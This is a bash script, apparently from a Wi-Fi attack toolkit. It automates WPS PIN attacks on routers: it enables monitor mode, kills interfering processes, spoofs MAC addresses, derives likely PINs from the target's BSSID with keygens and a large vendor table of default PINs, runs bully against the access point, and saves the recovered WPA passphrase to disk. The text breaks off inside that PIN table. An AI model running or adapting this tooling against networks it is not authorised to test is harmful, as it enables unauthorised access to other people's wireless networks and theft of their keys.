#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)

monX_Detection(){

Monitor_Mode_Interface_Check1=$(airmon-ng | grep "mon" | nl -ba -w 1  -s ': ')
if grep -q "2" <<< "$Monitor_Mode_Interface_Check1" ; then

   while true
   do

   clear
   Multiple_monX_Available=$(airmon-ng | grep "mon" | column -t | nl -ba -w 1  -s ': ' | sed -e "\$a0: Create A New Monitor Mode Interface")
   clear
   echo $RED"Multiple monitor mode interface's were detected."$STAND
   echo
   echo "$Multiple_monX_Available"
   echo ""
   read -p $GREEN"Please choose an option:$STAND " grep_Line_Number

   case $grep_Line_Number in
   1|2|3|4|5|6|7|8|9|1*|2*|3*|4*|5*|6*|7*|8*|9*|0)
   break ;;
   *) echo "Input was incorrect, please re-choose an option." ;;
   esac
   done

   if [[ $grep_Line_Number == "0" ]]; then
      clear
      Create_Monitor_Mode_Interface
   fi
else
   clear
   Monitor_Mode_Interface_Check2=$(airmon-ng | grep "mon")
   if [[ $Monitor_Mode_Interface_Check2 ]]; then

      while true
      do

      clear
      One_monX_Available=$(airmon-ng | grep "mon" | column -t | nl -ba -w 1  -s ': ' | sed -e "\$a0: Create A New Monitor Mode Interface")
      clear
      echo $RED"1 monitor mode interface was detected."$STAND
      echo
      echo "$One_monX_Available"
      echo ""
      read -p $GREEN"Please choose an option:$STAND " grep_Line_Number

      case $grep_Line_Number in
      1|2|3|4|5|6|7|8|9|1*|2*|3*|4*|5*|6*|7*|8*|9*|0)
      break ;;
      *) echo "Input was incorrect, please re-choose an option." ;;
      esac
      done

      if [[ $grep_Line_Number == "0" ]]; then
         clear
         Create_Monitor_Mode_Interface
      fi
   else
      clear
      echo $RED"0 monitor mode interface's were detected."$STAND
      sleep 3
      Create_Monitor_Mode_Interface
   fi
fi

monX=$(airmon-ng | grep "mon" | sed -n ""$grep_Line_Number"p" | awk '{ print $1 }')
clear
echo $RED"Chosen monitor interface:$STAND $monX"
sleep 3

Find_wlanX=$(airmon-ng | grep "$monX" | rev | awk '{ print $1 }' | rev | sed -e 's/\[//g' -e 's/\]//g')
wlanX=$(airmon-ng | grep "$Find_wlanX" | grep "wlan" | awk '{ print $1 }')

if [ "$(pidof NetworkManager)" ] 
then
   echo "Network Manager is running."
   Connection_Check=$(nmcli dev status | grep "$wlanX" | grep "disconnected")
   if [[ $Connection_Check ]]; then
      echo ""
      echo "$wlanX was already disconnected."
      sleep 3
   else
      echo ""
      echo $RED"Disconnecting $STAND"$wlanX"..."
      nmcli dev disconnect iface $wlanX
      sleep 3
      echo ""
   fi
else
   echo ""
   echo "Network Manager isn't running, skipping connection check."
   sleep 3
fi

Airmon_Check=$(airmon-ng check | sed '1,7d')
if [[ $Airmon_Check ]]; then
   while true
   do

   clear
   echo $RED"Possible conflicting processes were detected"$STAND
   echo "$Airmon_Check"
   echo ""
   echo $GREEN"[1]$BLUE = Airmon-ng Check Kill (Auto Kill Processes) ."$STAND
   echo $GREEN"[2]$BLUE = Launch System Monitor (Manually Select & Kill Processes)."$STAND
   echo $GREEN"[3]$BLUE = Continue Without Killing Processes."$STAND
   read -p $GREEN"Please choose an option?:$STAND " Kill_Processes_Options

   case $Kill_Processes_Options in
   1|2|3)
   break ;;
   *) echo "Input was incorrect, please re-choose an option." ;;
   esac
   done

   if [[ $Kill_Processes_Options == "1" ]]; then
      clear
      airmon-ng check kill
   fi

   if [[ $Kill_Processes_Options == "2" ]]; then
      clear
      gnome-system-monitor
      read -p $GREEN"When you have finished killing processes press [Enter] to continue.$STAND"
   fi

   if [[ $Kill_Processes_Options == "3" ]]; then
      clear
      echo $RED"Proceeding without killing any processes"$STAND
      sleep 3
   fi
else
   echo ""
fi

Details
}

Create_Monitor_Mode_Interface(){

clear
WiFi_Adapters_Check=$(airmon-ng | grep "wlan" | nl -ba -w 1  -s ': ')
if grep -q "2" <<< "$WiFi_Adapters_Check" ; then
   Multiple_WiFi_Adapters_Available=$(airmon-ng | grep "wlan" | column -t | nl -ba -w 1  -s ': ')
   clear
   echo $RED"Multiple WiFi adapters were detected."$STAND
   echo
   echo "$Multiple_WiFi_Adapters_Available"
   echo ""
   read -p $GREEN"Please choose a WiFi adapter to use for scanning:$STAND " grep_Line_Number
   wlanX=$(airmon-ng | grep "wlan" | column -t | nl -ba -w 1  -s ': ' | sed -n ""$grep_Line_Number"p" | awk '{ print $2 }')
else
   wlanX=$(airmon-ng | grep "wlan" | awk '{ print $1 }')
fi

if [ "$(pidof NetworkManager)" ] 
then
   echo "Network Manager is running."
   Connection_Check=$(nmcli dev status | grep "$wlanX" | grep "disconnected")
   if [[ $Connection_Check ]]; then
      echo ""
      echo "$wlanX was already disconnected."
      sleep 3
   else
      echo ""
      echo $RED"Disconnecting $STAND"$wlanX"..."
      nmcli dev disconnect iface $wlanX
      sleep 3
      echo ""
   fi
else
   echo ""
   echo "Network Manager isn't running, skipping connection check."
   sleep 3
fi

Airmon_Check=$(airmon-ng check | sed '1,7d')
if [[ $Airmon_Check ]]; then
   while true
   do

   clear
   echo $RED"Possible conflicting processes were detected"$STAND
   echo "$Airmon_Check"
   echo ""
   echo $GREEN"[1]$BLUE = Airmon-ng Check Kill (Auto Kill Processes) ."$STAND
   echo $GREEN"[2]$BLUE = Launch System Monitor (Manually Select & Kill Processes)."$STAND
   echo $GREEN"[3]$BLUE = Continue Without Killing Processes."$STAND
   read -p $GREEN"Please choose an option?:$STAND " Kill_Processes_Options

   case $Kill_Processes_Options in
   1|2|3)
   break ;;
   *) echo "Input was incorrect, please re-choose an option." ;;
   esac
   done

   if [[ $Kill_Processes_Options == "1" ]]; then
      clear
      airmon-ng check kill
   fi

   if [[ $Kill_Processes_Options == "2" ]]; then
      clear
      gnome-system-monitor
      read -p $GREEN"When you have finished killing processes press [Enter] to continue.$STAND"
   fi

   if [[ $Kill_Processes_Options == "3" ]]; then
      clear
      echo $RED"Proceeding without killing any processes"$STAND
      sleep 3
   fi
else
   echo ""
fi

clear
echo $RED"Enabling monitor mode for $STAND"$wlanX"..."$STAND
sleep 3

monX=$(airmon-ng start $wlanX | grep "monitor mode enabled on" | sed -e 's/(//g' -e 's/)//g' | awk '{ print $5 }')

Details
}

Details(){

FolderName=$(cat /usr/share/FS3/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $2 }' | sed -e 's/://g')

rm -r /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName &> /dev/null

mkdir /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName
cp /usr/share/FS3/Temp_Working_Dirctory/Chosen_AP_Line.txt /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName

AP_Name=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Chosen_AP_Line.txt | awk '{ print $1 }')
AP_essid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Chosen_AP_Line.txt | awk '{ print $1 }' | sed -e 's/+/ /g')
AP_bssid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Chosen_AP_Line.txt | awk '{ print $2 }')
AP_channel=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Chosen_AP_Line.txt | awk '{ print $5 }' | sed 's/Channel-//g')

Bully_And_Default_WPS_Pin_Keygens
}

Bully_And_Default_WPS_Pin_Keygens(){

clear
while true
do

clear
echo $RED"$wlanX:"$STAND
macchanger -s $wlanX
echo $RED"$monX:"$STAND
macchanger -s $monX

echo $RED"Note:"$STAND
echo $RED"Changing the mac address while performing multiple attacks might cause issue's."$STAND
echo ""
echo $GREEN"[1]$BLUE = Set A Random MAC Address.$STAND"
echo $GREEN"[2]$BLUE = Set A Custom MAC Address.$STAND"
echo $GREEN"[3]$BLUE = Continue Without Changing The MAC Address.$STAND"
read -p $GREEN"Please choose an option$STAND: " MACoption

case $MACoption in
1|2|3)
break ;;
*) echo "Input was incorrect, please re-choose an option." ;;
esac
done

if [[ $MACoption == "1" ]]; then
   clear
   echo $RED"Setting A Random MAC Address.$STAND"
   echo $RED"Please Wait..."$STAND
   ifconfig $wlanX down
   ifconfig $monX down
   wlanXmac=$(macchanger -r $wlanX | grep "New" | cut -c 16-32)
   echo ""
   macchanger --mac $wlanXmac $monX
   ifconfig $wlanX up
   ifconfig $monX up
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND $monX:"
   macchanger -s $monX
   sleep 2
fi

if [[ $MACoption == "2" ]]; then

   while true
   do

   clear
   echo $RED"Set A User specified MAC Address.$STAND"
   echo $RED"Please Wait..."$STAND
   ifconfig $wlanX down
   ifconfig $monX down
   echo ""
   echo $RED"Setting a random MAC address."$STAND
   macchanger -r $wlanX
   echo ""
   echo $RED"NOTE: Pressing the [Enter] button will generate a random mac address."$STAND
   read -p $GREEN"Input any mac address you want to use?.$STAND " SpecifiedInterfaceMAC

   case $SpecifiedInterfaceMAC in
   **:**:**:**:**:**)
   break ;;
   *) echo "Input was incorrect, please re-choose an option." ;;
   esac
   done

   macchanger --mac $SpecifiedInterfaceMAC $wlanX
   macchanger --mac $SpecifiedInterfaceMAC $monX
   ifconfig $wlanX up
   ifconfig $monX up
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"$STAND
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND $monX:"$STAND
   macchanger -s $monX
   sleep 2
fi

if [[ $MACoption == "3" ]]; then
   clear
fi

PinMAC1=$(echo $AP_bssid | sed 's/://g' | cut -c 7-12)
PinMAC2=$(echo $AP_bssid | sed 's/://g' | cut -c 1-6)
WPSpin1=`python /usr/share/FS3/Scripts/WPSpin.py $PinMAC1 | awk '{ print $7 }'`
WPSpin2=`python /usr/share/FS3/Scripts/WPSpin.py $PinMAC2 | awk '{ print $7 }'`
easybox=`python /usr/share/FS3/Scripts/easybox_wps.py $AP_bssid | grep "WPS pin" | cut -c 10-17`

WPSPIN_Generator
echo $WPSpin1 >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
echo $WPSpin2 >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
echo $easybox >> /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt
awk '!_[$1]++' /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt > /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins-Cleaned.txt
sed -ni '/^.\{8\}/p' /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins-Cleaned.txt
PinList=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins-Cleaned.txt)

while true
do

clear
echo $RED"Possible WPS Pins:"$STAND
Presented_PinList=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins-Cleaned.txt | nl -ba -w 1  -s ': ')
echo ""
echo "$Presented_PinList"
echo ""
echo "$GREEN[p]$BLUE = Input A Different Pin.$STAND"
read -p $GREEN"Input the number of a pin or choose an option$STAND: " Pin_Choice

case $Pin_Choice in
1|2|3|4|5|6|7|8|9|1*|2*|3*|4*|5*|6*|7*|8*|9*|p)
break ;;
*) echo "Input was incorrect, please re-choose an option." ;;
esac
done

if [[ $Pin_Choice == "p" ]]; then
   clear
   read -p $GREEN"Please input the WPS Pin:$STAND " User_Pin
   clear
   echo $RED"Bully & WPS-Pin Attack Command:"$STAND
   echo "bully $monX -c $AP_channel -b $AP_bssid -F -B -l 60 -v 3 -p $User_Pin"
   echo ""
   read -p $GREEN"Press $RED[Enter]$GREEN to launch the attack.$STAND"
   clear

   xterm -geometry 100x12+675+500 -l -lf /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt -e "bully $monX -c $AP_channel -b $AP_bssid -F -B -l 60 -v 3 -p $User_Pin"

   cat /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt | tail -20

if [[ -f /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt ]]; then
   Recovered_Passkey_Check=$(grep "KEY : '" /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt)
   if [[ $Recovered_Passkey_Check ]]; then

      echo ""
      echo $RED"Recovered passkey & WPS pin will be coppied to:"
      echo $STAND"/usr/share/FS3/Passkeys/"$AP_Name".txt"
      echo ""
      read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND

      echo 'ESSID: '$AP_essid'' > /usr/share/FS3/Passkeys/"$AP_Name".txt

      echo 'BSSID: '$AP_bssid'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt

      tail -4 /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt | sed -e 's/^[ \t]*//;s/[ \t]*$//' | sed s/\'//g | sed -e 's/PIN : /WPS PIN: /g' -e 's/KEY : /WPA PSK: /g' | grep "WPS PIN:" >> /usr/share/FS3/Passkeys/"$AP_Name".txt

      tail -4 /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt | sed -e 's/^[ \t]*//;s/[ \t]*$//' | sed s/\'//g | sed -e 's/PIN : /WPS PIN: /g' -e 's/KEY : /WPA PSK: /g' | grep "WPA PSK:" >> /usr/share/FS3/Passkeys/"$AP_Name".txt

      rm -r /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName &> /dev/null
      exit
   fi
fi

echo ""
echo "Bully was cancelled or it failed."
sleep 5

while true
do

clear
echo $GREEN"[1]$BLUE = Retry attack."$STAND
echo $GREEN"[q]$BLUE = Exit attack."$STAND
read -p $GREEN"Please choose an option?:$STAND " Options

case $Options in
1|q)
break ;;
*) echo "Input was incorrect, please re-choose an option." ;;
esac
done

if [[ $Options == "1" ]]; then
   rm /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt &> /dev/null
   rm /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins-Cleaned.txt &> /dev/null
   rm /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt &> /dev/null
   Bully_And_Default_WPS_Pin_Keygens
fi

if [[ $Options == "q" ]]; then
   clear
   rm -r /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName &> /dev/null
   exit
fi
fi

Chosen_Pin=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins-Cleaned.txt | sed -n ""$Pin_Choice"p" | sed 's/^[ \t]*//;s/[ \t]*$//')
clear
echo $RED"Bully & WPS-Pin Attack Command:"$STAND
echo "bully $monX -c $AP_channel -b $AP_bssid -F -B -l 60 -v 3 -p $Chosen_Pin"
echo ""
read -p $GREEN"Press $RED[Enter]$GREEN to launch the attack.$STAND"
clear

xterm -geometry 100x12+675+500 -l -lf /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt -e "bully $monX -c $AP_channel -b $AP_bssid -F -B -l 60 -v 3 -p $Chosen_Pin"

cat /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt | tail -20

if [[ -f /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt ]]; then
   Recovered_Passkey_Check=$(grep "KEY : '" /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt)
   if [[ $Recovered_Passkey_Check ]]; then

      echo ""
      echo $RED"Recovered passkey & WPS pin will be coppied to:"
      echo $STAND"/usr/share/FS3/Passkeys/"$AP_Name".txt"
      echo ""
      read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND

      echo 'ESSID: '$AP_essid'' > /usr/share/FS3/Passkeys/"$AP_Name".txt

      echo 'BSSID: '$AP_bssid'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt

      tail -4 /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt | sed -e 's/^[ \t]*//;s/[ \t]*$//' | sed s/\'//g | sed -e 's/PIN : /WPS PIN: /g' -e 's/KEY : /WPA PSK: /g' | grep "WPS PIN:" >> /usr/share/FS3/Passkeys/"$AP_Name".txt

      tail -4 /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt | sed -e 's/^[ \t]*//;s/[ \t]*$//' | sed s/\'//g | sed -e 's/PIN : /WPS PIN: /g' -e 's/KEY : /WPA PSK: /g' | grep "WPA PSK:" >> /usr/share/FS3/Passkeys/"$AP_Name".txt

      rm -r /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName &> /dev/null
      exit
   fi
fi

echo ""
echo "Bully was cancelled or it failed."
sleep 5

while true
do

clear
echo $GREEN"[1]$BLUE = Retry attack."$STAND
echo $GREEN"[q]$BLUE = Exit attack."$STAND
read -p $GREEN"Please choose an option?:$STAND " Options

case $Options in
1|q)
break ;;
*) echo "Input was incorrect, please re-choose an option." ;;
esac
done

if [[ $Options == "1" ]]; then
   rm /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins.txt &> /dev/null
   rm /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Pins-Cleaned.txt &> /dev/null
   rm /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName/Bully.txt &> /dev/null
   Bully_And_Default_WPS_Pin_Keygens
fi

if [[ $Options == "q" ]]; then
   clear
   rm -r /usr/share/FS3/Temp_Working_Dirctory/Bully_And_Pin_$FolderName &> /dev/null
   exit
fi
}

##################################### WPSPIN-1.5 Generater #####################################
WPSPIN_Generator(){

GENERATE(){
DEFAULTWPA=""
APRATE=0
UNKNOWN=0
SPECIAL=0
FABRICANTE=""
MODEL=""
DEFAULTSSID=""
CHECKBSSID=$(echo $BSSID | cut -d ":" -f1,2,3 | tr -d ':')
FINBSSID=$(echo $BSSID | cut -d ':' -f4,5,6)
MAC=$(echo $FINBSSID | tr -d ':')
CONVERTEDMAC=$(printf '%d\n' 0x$MAC) 2> /dev/null

case $CHECKBSSID in

04C06F | 202BC1 | 285FDB | 346BD3 | 80B686 | 84A8E4 | B4749F | BC7670 | CC96A0 | F83DFF)    # For FTE-XXXX (HG552c), original algorithm by kcdtv  
FINESSID=$(echo $ESSID | cut -d '-' -f2)
PAREMAC=$(echo $FINBSSID | cut -d ':' -f1 | tr -d ':')
CHECKMAC=$(echo $FINBSSID | cut -d ':' -f2- | tr -d ':')
if [[ $ESSID =~ ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] &&   [[ $(printf '%d\n' 0x$CHECKMAC) = `expr $(printf '%d\n' 0x$FINESSID) '+' 7` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 1` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 7` ]];  
       
then
MACESSID=$(echo $PAREMAC$FINESSID)
PRESTRING=`expr $(printf '%d\n' 0x$MACESSID) '+' 7`
STRING=`expr '(' $PRESTRING '%' 10000000 ')' `

CHECKSUM

  else
  STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')' '+' 8`

  CHECKSUM

  PIN2=$PIN
  STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')' '+' 14`

  CHECKSUM

  PIN3=$PIN                                           

  ZAOMODE

  CHECKSUM

fi

FABRICANTE="HUAWEI"
DEFAULTSSID="FTE-XXXX"
MODEL="HG532c Echo Life"
ACTIVATED=1
;;
C8D15E )

FABRICANTE="HUAWEI"
DEFAULTSSID="Jazztel_XX "
MODEL="HG532c Echo Life"
ACTIVATED=1
;;
001915 )

PIN=12345670

FABRICANTE="TECOM Co., Ltd."
DEFAULTSSID="WLAN_XXXX"
MODEL="AW4062"
ACTIVATED=0
;;
F43E61 | 001FA4)

PIN=12345670

FABRICANTE="Shenzhen Gongjin Electronics Co., Ltd"
DEFAULTSSID="WLAN_XXXX"
MODEL="Encore ENDSL-4R5G"
ACTIVATED=1
;;
404A03)

PIN=11866428

FABRICANTE="ZyXEL Communications Corporation"
DEFAULTSSID="WLAN_XXXX"
MODEL="P-870HW-51A V2"
ACTIVATED=1
;;
001A2B)

PIN=88478760
PIN2=77775078
FABRICANTE="Ayecom Technology Co., Ltd."
DEFAULTSSID="WLAN_XXXX"
MODEL="Comtrend Gigabit 802.11n"
ACTIVATED=1
SPECIAL=1
;;
3872C0)

PIN=18836486
PIN2=20172527

FABRICANTE="Ayecom Technology Co., Ltd."
DEFAULTSSID="JAZZTEL_XXXX"
MODEL="Comtrend AR-5387un"
ACTIVATED=0
;;
FCF528)

PIN=20329761                           

FABRICANTE="ZyXEL Communications Corporation"
DEFAULTSSID="WLAN_XXXX"
MODEL="P-870HNU-51B"
ACTIVATED=1
APRATE=1

;;
3039F2)
PIN=16538061
PIN2=16702738
PIN3=18355604
PIN4=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1

;;
74888B)                   ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=43297917
PIN2=73767053
PIN3=88202907
PIN4=16538061
PIN5=16702738
PIN6=18355604
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1

;;
A4526F)                  ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=16538061
PIN2=88202907
PIN3=73767053 
PIN4=16702738
PIN5=43297917
PIN6=18355604
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1
 
;;
DC0B1A)                   ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=16538061
PIN2=16702738
PIN3=18355604
PIN4=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1

;;
D0D412)                  ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN4=16538061
PIN2=16702738
PIN3=18355604
PIN=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1

;;
5C4CA9 | 62233D | 623CE4 | 623DFF | 62559C | 627D5E | 6296BF | 62A8E4 | 62B686 | 62C06F | 62C61F | 62C714 | 62CBA8 | 62E87B | 6A1D67 | 6A233D | 6A3DFF | 6A53D4 | 6A559C | 6A6BD3 | 6A7D5E | 6AA8E4 | 6AC06F | 6AC61F | 6AC714 | 6ACBA8 | 6AD15E | 6AD167 | 723DFF | 7253D4 | 72559C | 726BD3 | 727D5E | 7296BF | 72A8E4 | 72C06F | 72C714 | 72CBA8 | 72D15E | 72E87B )   

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="HUAWEI"         ############# HUAWEI HG 566a vodafoneXXXX > Pin algo zao
DEFAULTSSID="vodafoneXXXX"
MODEL="HG 566a"
ACTIVATED=1

;;
002275)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin Belkin_N+_XXXXXX  F5D8235-4 v 1000  > Pin algo zao
DEFAULTSSID="Belkin_N+_XXXXXX"
MODEL="F5D8235-4 v 1000"
ACTIVATED=1

;;
08863B)

if [[ -n `(echo "$ESSID" | grep -E '_xt' )` ]];

  then 
UNKNOWN=2
FABRICANTE="Belkin"
DEFAULTSSID="XX...-xt"
MODEL="N300 Dual-Band Wi-Fi Range Extender"
ACTIVATED=1
APRATE=1
 else

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin belkin. F5D8235-4 v 1000  > Pin algo zao # update: several models share this bssid
DEFAULTSSID="belkin.XXX"
MODEL="F9K1104(N900 DB Wireless N+ Router)"
ACTIVATED=1
SPECIAL=1

fi

;;
001CDF)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin belkin. F5D8235-4 v 1000  > Pin algo zao
DEFAULTSSID="belkin.XXX"
MODEL="F5D8235-4 v 1000"
ACTIVATED=1

;;
00A026)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Teldat"         ############# Teldat WLAN_XXXX iRouter1104-W  > Pin algo zao
DEFAULTSSID="WLAN_XXXX"
MODEL="iRouter1104-W"
ACTIVATED=1

;;
5057F0)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="ZyXEL Communications Corporation"         ############# Zyxel ZyXEL zyxel NBG-419n  > Pin algo zao
DEFAULTSSID="ZyXEL"
MODEL="zyxel NBG-419n"
ACTIVATED=1

;;
C83A35 | 00B00C | 081075)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Tenda"         ############# Tenda W309R  > Pin algo zao, original router that was used by ZaoChusheng to reveal the security breach
DEFAULTSSID="cf. computepinC83A35"
MODEL="W309R"
ACTIVATED=1

;;
E47CF9 | 801F02)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="SAMSUNG"         ############# SAMSUNG   SEC_ LinkShare_XXXXXX  SWL (Samsung Wireless Link)  > Pin algo zao
DEFAULTSSID="SEC_ LinkShare_XXXXXX"
MODEL="SWL (Samsung Wireless Link)"
ACTIVATED=1

;;
0022F7)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Conceptronic"         ############# CONCEPTRONIC   C300BRS4A  c300brs4a  > Pin algo zao
DEFAULTSSID="C300BRS4A"
MODEL="c300brs4a"
ACTIVATED=1

;;                                 ########### NEW DEVICES SUPPORTED FOR VERSION 1.5 XD
F81A67 | F8D111 | B0487A | 647002 )              

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="TP-LINK"             ######## TP-LINK_XXXXXX  TP-LINK  TD-W8961ND v2.1   > Pin algo zao
DEFAULTSSID="TP-LINK_XXXXXX"
MODEL="TD-W8961ND v2.1"
ACTIVATED=1
APRATE=1

;;
001F1F)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="EDIMAX"              ########## EDIMAX 3G-6200n "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="3G-6200n"
ACTIVATED=1

;;
001F1F)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="EDIMAX"              ########## EDIMAX 3G-6200n/3G-6210n "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="3G-6200n & 3G-6210n"
ACTIVATED=1

;;
0026CE)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="KUZOMI"              ########## KUZOMI K1500 & K1550 "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="K1500 & K1550"
ACTIVATED=1

;;
90F652)

PIN=12345670

FABRICANTE="TP-LINK"            ########## TP-LINK  TP-LINK_XXXXXX  TL-WA7510N  > PIN   generic 12345670
DEFAULTSSID="TP-LINK_XXXXXX"
MODEL="TL-WA7510N"
ACTIVATED=1

;;
7CD34C)                        ########### SAGEM FAST 1704    > PIN GENERIC 43944552

PIN=43944552

FABRICANTE="SAGEM"
DEFAULTSSID="SAGEM_XXXX"
MODEL="fast 1704"
ACTIVATED=1

;;
000CC3)                               ########### BEWAN, two default ssid abd two default PIN ELE2BOX_XXXX > 47392717   Darty box ; 12345670

if [[ $ESSID =~ ^TELE2BOX_[[:xdigit:]]{4}[[:blank:]]*$ ]]; then

FABRICANTE="BEWAN"
DEFAULTSSID="TELE2BOX_XXXX"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
APRATE=1
PIN=47392717

elif  [[ $ESSID =~ ^DartyBox_[[:xdigit:]]{3}_[[:xdigit:]]{1}*$ ]]; then

FABRICANTE="BEWAN"
DEFAULTSSID="DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
PIN=12345670

else

FABRICANTE="BEWAN"
DEFAULTSSID="TELE2BOX_XXXX / DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
APRATE=1
PIN=47392717
PIN2=12345670

fi

;;
A0F3C1)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="TP-LINK"             ######## TP-LINK_XXXXXX  TP-LINK TD-W8951ND   > Pin algo zao
DEFAULTSSID=$(echo "TP-LINK_XXXX(XX)")
MODEL="TD-W8951ND"
ACTIVATED=1
SPECIAL=1

;;
5CA39D | DC7144 | D86CE9)              # Bbox with Essid Bbox-XXXXXXXX, algo zao, no limits by samsung

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Samsung"
ACTIVATED=1
DEFAULTSSID="Bbox-XXXXXXXX"
MODEL="Bbox by Samsung"
ACTIVATED=1

;;
B8A386)          # D-Link DSL-2730U con PIN generico 20172527

DEFAULTSSID="Dlink_XXXX"
FABRICANTE="D-Link"
MODEL="D-Link DSL-2730U"
ACTIVATED=1
PIN=20172527

;;
C8D3A3)                  # D-Link DSL-2750U con PIN generico 21464065   

DEFAULTSSID="Dlink_XXXX"
FABRICANTE="D-Link"
MODEL="D-Link DSL-2750U"
ACTIVATED=1
PIN=21464065

;;
